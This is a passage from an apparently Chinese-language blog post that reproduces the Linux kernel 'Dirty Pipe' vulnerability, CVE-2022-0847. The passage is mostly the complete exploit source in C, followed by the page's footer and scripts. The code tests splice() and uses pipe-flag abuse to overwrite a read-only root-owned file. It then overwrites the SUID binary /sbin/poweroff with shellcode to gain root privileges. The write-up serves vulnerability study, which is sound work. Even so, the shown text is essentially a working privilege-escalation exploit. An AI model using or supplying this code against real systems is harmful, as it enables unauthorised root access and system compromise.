class="line"></span><br><span class="line"><span class="type">char</span> *<span class="title function_">check_file</span><span class="params">(<span class="type">int</span> fd)</span> &#123;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">stat</span> *<span class="title">stat_buf</span> =</span> <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">struct</span> stat));</span><br><span class="line">  fstat(fd, stat_buf);</span><br><span class="line"></span><br><span class="line">  <span class="type">uint64_t</span> size = stat_buf-&gt;st_size;</span><br><span class="line">  <span class="type">char</span> *buffer = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (size &gt; <span class="number">0x100</span>) &#123;</span><br><span class="line">    size = <span class="number">0x100</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(lseek(fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(read(fd, buffer, size));</span><br><span class="line">  dump_hex(buffer, size);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(stat_buf);</span><br><span class="line">  <span class="keyword">return</span> buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// <span class="doctag">NOTE:</span> Linux Kernel exploit template</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">  <span class="comment">// INFO: Step 0x01: Check splice</span></span><br><span class="line">  step(<span class="string">&quot;Check splice&quot;</span>);</span><br><span class="line">  save_stat();</span><br><span class="line"></span><br><span class="line">  create_file();</span><br><span class="line">  info(<span class="string">&quot;Now file content:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(check_file(fd));</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> pipe_fd0[<span class="number">2</span>], pipe_fd1[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">  check(pipe(pipe_fd0));</span><br><span class="line">  info(<span class="string">&quot;Create to pipes\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Fork and test\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!fork()) &#123;</span><br><span class="line">    info(<span class="string">&quot;pid %d: write pipe\n&quot;</span>, getpid());</span><br><span class="line">    check(write(pipe_fd0[<span class="number">1</span>], <span class="string">&quot;ccccdddd&quot;</span>, <span class="number">0x8</span>));</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;pid %d: splice pipe to file\n&quot;</span>, getpid());</span><br><span class="line">  check(lseek(fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(splice(pipe_fd0[<span class="number">0</span>], <span class="literal">NULL</span>, fd, <span class="literal">NULL</span>, <span class="number">0x10</span>, SPLICE_F_MOVE));</span><br><span class="line">  check(fsync(fd));</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Now file content:\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *splice_chk = check_file(fd);</span><br><span class="line">  <span class="keyword">if</span> (!<span class="built_in">memcmp</span>(splice_chk, <span class="string">&quot;ccccdddd&quot;</span>, <span class="number">0x8</span>)) &#123;</span><br><span class="line">    <span class="built_in">free</span>(splice_chk);</span><br><span class="line">    success(<span class="string">&quot;Test splice OK\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(splice_chk);</span><br><span class="line">    err_exit(<span class="string">&quot;Test splice failed!\n&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(pipe_fd0[<span class="number">0</span>]);</span><br><span class="line">  close(pipe_fd0[<span class="number">1</span>]);</span><br><span class="line">  close(fd);</span><br><span class="line">  <span class="comment">// INFO: Step 0x02: Reproduce CVE-2022-0847 &lt;PoC&gt;</span></span><br><span class="line">  step(<span class="string">&quot;Reproduce CVE-2022-0847 &lt;PoC&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> root_fd = check(open(root_file_name, O_RDONLY));</span><br><span class="line">  info(<span class="string">&quot;Open root file with fd %d\n&quot;</span>, root_fd);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Root file content:\n&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(check_file(root_fd));</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Make new pipe fds\n&quot;</span>);</span><br><span class="line">  check(pipe(pipe_fd1));</span><br><span class="line"></span><br><span class="line">  <span class="type">char</span> *buffer = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write(pipe_fd1[<span class="number">1</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line">  info(<span class="string">&quot;Write 0x10 pages to pipe\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  success(<span class="string">&quot;Now this pipe has flag PIPE_BUF_FLAG_CAN_MERGE\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  check(read(pipe_fd1[<span class="number">0</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  check(lseek(root_fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(splice(root_fd, <span class="literal">NULL</span>, pipe_fd1[<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">0x10</span>, SPLICE_F_MOVE));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buffer, <span class="string">&quot;hamood?&quot;</span>, <span class="number">8</span>);</span><br><span class="line">  check(write(pipe_fd1[<span class="number">1</span>], buffer, <span class="number">0x8</span>));</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Root file content now:\n&quot;</span>);</span><br><span class="line">  <span class="type">char</span> *cve_chk = check_file(root_fd);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">strstr</span>(cve_chk, <span class="string">&quot;hamood?&quot;</span>)) &#123;</span><br><span class="line">    <span class="built_in">free</span>(cve_chk);</span><br><span class="line">    success(<span class="string">&quot;CVE-2022-0847 reproduced successfully!\n&quot;</span>);</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(cve_chk);</span><br><span class="line">    err_exit(<span class="string">&quot;Failed to reproduce CVE-2022-0847&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  close(pipe_fd1[<span class="number">0</span>]);</span><br><span class="line">  close(pipe_fd1[<span class="number">1</span>]);</span><br><span class="line">  close(root_fd);</span><br><span class="line"></span><br><span class="line"><span class="comment">// INFO: Step 0x03: Reproduce CVE-2022-0847 &lt;Exp&gt;</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUID_FILE <span class="string">&quot;/sbin/poweroff&quot;</span></span></span><br><span class="line">  step(<span class="string">&quot;Reproduce CVE-2022-0847 &lt;Exp&gt;&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> evil_pipe[<span class="number">2</span>];</span><br><span class="line">  <span class="type">int</span> suid_fd = check(open(SUID_FILE, O_RDONLY));</span><br><span class="line">  <span class="type">uint64_t</span> offset = <span class="number">0x1</span>;</span><br><span class="line">  pipe(evil_pipe);</span><br><span class="line">  info(<span class="string">&quot;Open suid file &quot;</span> SUID_FILE <span class="string">&quot; with fd %d\n&quot;</span>, root_fd);</span><br><span class="line"></span><br><span class="line">  info(<span class="string">&quot;Use CVE-2022-0847 to overwrite &quot;</span> SUID_FILE <span class="string">&quot;...\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x10</span>; ++i) &#123;</span><br><span class="line">    <span class="built_in">memset</span>(buffer, i, <span class="number">0x1000</span>);</span><br><span class="line">    check(write(evil_pipe[<span class="number">1</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  check(read(evil_pipe[<span class="number">0</span>], buffer, <span class="number">0x1000</span>));</span><br><span class="line">  check(lseek(root_fd, <span class="number">0</span>, SEEK_SET));</span><br><span class="line">  check(splice(root_fd, <span class="literal">NULL</span>, evil_pipe[<span class="number">1</span>], <span class="literal">NULL</span>, offset, SPLICE_F_MOVE));</span><br><span class="line"></span><br><span class="line">  <span class="built_in">memcpy</span>(buffer, shellcode + offset, <span class="keyword">sizeof</span>(shellcode) - offset);</span><br><span class="line">  check(write(evil_pipe[<span class="number">1</span>], buffer, <span class="keyword">sizeof</span>(shellcode) - offset));</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> suid_chk_fd = check(open(SUID_FILE, O_RDONLY));</span><br><span class="line">  <span class="built_in">free</span>(check_file(suid_chk_fd));</span><br><span class="line">  success(<span class="string">&quot;Change suid file &quot;</span> SUID_FILE</span><br><span class="line">          <span class="string">&quot; successfully, Now trigger manually\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">free</span>(buffer);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">for</span> (;;) &#123;</span><br><span class="line">    sleep(<span class="number">0x100</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

  </div>
</article>


    <div class="blog-post-comments">
        <div id="utterances_thread">
            <noscript>Please enable JavaScript to view the comments.</noscript>
        </div>
    </div>


        
          <div id="footer-post-container">
  <div id="footer-post">

    <div id="nav-footer" style="display: none">
      <ul>
        
          <li><a href="/">Home</a></li>
        
          <li><a href="/about/">About</a></li>
        
          <li><a href="/archives/">Writing</a></li>
        
          <li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li>
        
          <li><a href="/tags">tags</a></li>
        
      </ul>
    </div>

    
    
      <div id="toc-footer" style="display: none">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E8%83%8C%E6%99%AF"><span class="toc-number">1.</span> <span class="toc-text">漏洞背景</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#pipe"><span class="toc-number">1.1.</span> <span class="toc-text">pipe()</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#splice"><span class="toc-number">1.2.</span> <span class="toc-text">splice()</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E6%88%90%E5%9B%A0"><span class="toc-number">2.</span> <span class="toc-text">漏洞成因</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0"><span class="toc-number">3.</span> <span class="toc-text">漏洞复现</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#PoC-%E9%83%A8%E5%88%86"><span class="toc-number">3.1.</span> <span class="toc-text">PoC 部分</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Exp-%E9%83%A8%E5%88%86"><span class="toc-number">3.2.</span> <span class="toc-text">Exp 部分</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%8C%E6%95%B4%E4%BB%A3%E7%A0%81"><span class="toc-number">4.</span> <span class="toc-text">完整代码</span></a></li></ol>
      </div>
    

    <div id="share-footer" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2025/10/30/cve-2022-0847/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2025/10/30/cve-2022-0847/&text=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2025/10/30/cve-2022-0847/&is_video=false&description=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=[CVE-2022-0847] dirty pipe 复现&body=Check out this article: http://example.com/2025/10/30/cve-2022-0847/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2025/10/30/cve-2022-0847/&title=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2025/10/30/cve-2022-0847/&name=[CVE-2022-0847] dirty pipe 复现&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2025/10/30/cve-2022-0847/&t=[CVE-2022-0847] dirty pipe 复现"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
</ul>

    </div>

    <div id="actions-footer">
        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
        
          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
        
        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
    </div>

  </div>
</div>

        
        <footer id="footer">
  <div class="footer-left">
    Copyright &copy;
    
    
    2016-2025
    NázrinKacsa
  </div>
  <div class="footer-right">
    <nav>
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a target="_blank" rel="noopener" href="https://github.com/NazrinDuck">Projects</a></li><!--
     --><!--
       --><li><a href="/tags">tags</a></li><!--
     -->
      </ul>
      <ul>
      
        <!-- 不蒜子统计 -->
        <span id="busuanzi_container_site_pv">
          本站总访问量<span id="busuanzi_value_site_pv"></span>次
        </span>
        <span class="post-meta-divider">|</span>
        <span id="busuanzi_container_site_uv" style='display:none'>
          访客数<span id="busuanzi_value_site_uv"></span>人
        </span>
        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
      
    </ul>
    </nav>
  </div>
</footer>

    </div>
    <!-- styles -->



  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>


    <!-- jquery -->

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>




<!-- clipboard -->

  
    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
  
  <script type="text/javascript">
  $(function() {
    // copy-btn HTML
    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
    btn += '<i class="fa-regular fa-clone"></i>';
    btn += '</span>';
    // mount it!
    $(".highlight table").before(btn);
    var clip = new ClipboardJS('.btn-copy', {
      text: function(trigger) {
        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
      }
    });
    clip.on('success', function(e) {
      e.trigger.setAttribute('aria-label', "Copied!");
      e.clearSelection();
    })
  })
  </script>


<script src="/js/main.js"></script>

<!-- search -->

<!-- Baidu Analytics -->

  <script type="text/javascript">
        var _hmt = _hmt || [];
        (function() {
          var hm = document.createElement("script");
          hm.src = "https://hm.baidu.com/hm.js?2e6da3c375c8a87f5b664cea6d4cb29c";
          var s = document.getElementsByTagName("script")[0];
          s.parentNode.insertBefore(hm, s);
        })();
        </script>

<!-- Cloudflare Analytics -->

<!-- Disqus Comments -->

<!-- utterances Comments -->

    <script type="text/javascript">
      var utterances_repo = 'NazrinDuck/NazrinDuck.github.io';
      var utterances_issue_term = 'pathname';
      var utterances_label = 'Comment';
      var utterances_theme = 'github-dark';

      (function(){
          var script = document.createElement('script');

          script.src = 'https://utteranc.es/client.js';
          script.setAttribute('repo', utterances_repo);
          script.setAttribute('issue-term', 'pathname');
          script.setAttribute('label', utterances_label);
          script.setAttribute('theme', utterances_theme);
          script.setAttribute('crossorigin', 'anonymous');
          script.async = true;
          (document.getElementById('utterances_thread')).appendChild(script);
      }());
  </script>

</body>
</html>
